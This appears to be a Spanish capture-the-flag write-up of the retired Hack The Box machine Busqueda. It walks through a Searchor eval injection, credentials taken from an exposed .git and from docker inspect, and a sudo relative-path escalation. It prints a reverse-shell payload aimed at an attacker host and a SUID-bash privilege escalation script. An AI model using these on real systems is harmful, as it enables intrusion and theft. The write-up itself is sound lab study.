---
machine: Busqueda
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Inyección
state: Retired
tags: [searchor, cve-2023-43364, eval, gitea, docker, sudo]
---

# Busqueda — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

La web usa **Searchor 2.4.0**, cuyo `eval()` sobre la URL de búsqueda es una **inyección de código Python** (CVE-2023-43364) → shell como `svc`. Un `.git` expuesto en `/var/www/app` da credenciales de **Gitea**, que corre en local; sus credenciales de administrador salen de `docker inspect`. El script `system-checkup.py` se ejecuta como root por `sudo` y llama a `./full-checkup.sh` por **ruta relativa**: shell root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
# 22 ssh, 80 http (Apache, searcher.htb)
```

```bash
git-dumper http://searcher.htb/ /tmp/app
cd /tmp/app && git log -p | grep -iE 'password|user'
```

## Enumeración

El pie del sitio dice `Powered by Searchor` y la versión **2.4.0** está en el HTML. `/var/www/app` expone su `.git`: `git log -p` da la URL del remoto de Gitea con credenciales. `sudo -l` muestra `/usr/bin/python3 /opt/scripts/system-checkup.py *`.

## Foothold

```text
/search?engine=Google&query=test'
```

El `'` rompe el `eval`; se escapa y se añade código:

```python
'+__import__('os').system('bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"')+'
```

Shell como `svc`.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

1. **Gitea** en `127.0.0.1:3000`; el `.git` del sitio tenía credenciales de un usuario.
2. Con `sudo -l`:

```text
(root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

3. `docker-inspect` del contenedor `gitea` vuelca sus variables de entorno, incluida la contraseña de la **base de datos** (`GITEA__database__PASSWD`); la cuenta `administrator` de Gitea reutiliza la contraseña de `cody`. En el repo de Gitea está el código de `system-checkup.py`.
4. `full-checkup` ejecuta `./full-checkup.sh` desde el **directorio actual**:

```bash
printf '#!/bin/bash\nchmod +s /bin/bash\n' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Túnel al 3000**: `ssh -L 3000:127.0.0.1:3000 svc@<IP>` para ver Gitea.
- **Ruta relativa**: si se ejecuta desde otro directorio, el script falla ("Something went wrong").
- **`eval` con comillas**: hay que cerrar la cadena exactamente como la construye Searchor.

- `eval()` con entrada de usuario es ejecución de código, no "búsqueda".
- Un `.git` accesible es un historial de credenciales.
- `sudo` sobre un script que llama a rutas relativas es root con un fichero en el directorio actual.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- [CVE-2023-43364](https://nvd.nist.gov/vuln/detail/CVE-2023-43364)
